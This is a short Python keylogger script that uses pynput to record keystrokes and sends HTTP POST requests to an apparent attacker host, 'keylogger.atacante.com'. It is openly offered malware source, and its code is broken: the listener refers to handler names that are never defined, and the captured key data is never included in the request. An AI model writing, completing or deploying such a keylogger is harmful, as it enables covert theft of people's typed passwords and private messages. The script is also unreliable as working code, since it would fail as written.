from pynput import keyboard
import requests

def onKeyPress(key):
    try:
        char=key.char
    except AttributeError:
        char=str(key)

    data={'key':char}
    response=requests.post('https://keylogger.atacante.com')

with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
